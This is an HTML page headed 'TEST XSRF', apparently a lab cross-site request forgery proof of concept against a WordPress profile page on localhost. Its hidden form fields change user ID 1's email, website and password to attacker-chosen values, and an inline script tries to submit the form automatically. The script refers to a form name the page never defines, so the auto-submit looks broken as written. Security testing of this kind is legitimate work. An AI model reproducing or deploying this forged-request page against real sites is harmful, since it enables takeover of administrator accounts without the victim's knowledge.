<!doctype html>
<html>
<p>TEST XSRF</p>
<body>
<form action="http://localhost:85/frameworks/wordpress/wp-admin/profile.php" method="post">
    <input type="hidden" id="_wpnonce" name="_wpnonce" value="ae8faa1cfa">
    <input type="hidden" name="_wp_http_referer" value="/frameworks/wordpress/wp-admin/profile.php?updated=1">
        <input type="hidden" name="from" value="profile">
        <input type="hidden" name="checkuser_id" value="1">
            <input type="hidden" name="user_login"  value="webvul">

           <input type="hidden" name="first_name" value="kanda">

            <input type="hidden" name="last_name"  value="Yeng">
            <input type="text" name="nickname"  value="kandabongee">

           <input type="email" name="email"  value="kanda@gmail.com">
          <input type="url" name="url" id="url" value="http://www.esec.com">


    <input type="hidden" name="description" value="xxxxx112233dd">

    <input name="pass2" type="hidden"  value="passyeng">

    <input type="hidden" name="pw_weak" checked>

    <input type="hidden" name="action" value="update">
    <input type="hidden" name="user_id" value="1">

    <input type="hidden" name="submit" value="Update Profile">
</form>
<script>
    document.xsrf_attack1.submit();
    

</script>
</body>
</html>